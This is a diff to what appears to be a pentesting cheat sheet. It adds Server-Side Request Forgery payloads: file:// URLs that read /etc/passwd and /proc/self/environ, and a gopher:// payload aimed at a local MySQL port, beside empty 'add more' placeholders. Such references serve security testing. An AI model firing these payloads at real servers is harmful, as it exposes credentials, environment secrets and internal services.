@@ -275,12 +275,35 @@ Note:
 - Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
 ```
 
-
 ---
 ### Server-Side Request Forgery
 ---
 Summary: Attacker can make requests from a server to target its internal systems (i.e intranet) by bypassing its firewalls.
 
+File Protocol:
+```
+file:///etc/passwd
+file:///proc/self/cmdline
+file:///proc/self/exe
+file:///proc/self/environ
+curl file://google.com/etc/passwd
+```
+
+Gopher Protocol:
+```
+gopher://127.0.0.1:3306/_<PAYLOAD>      // MySQL
+add more
+```
+
+Elastic Search (default port:9200/9300:
+```
+add more
+```
+
+AWS:
+```
+add more
+```
 
 ---
 ### Amazon Web Services SSRF
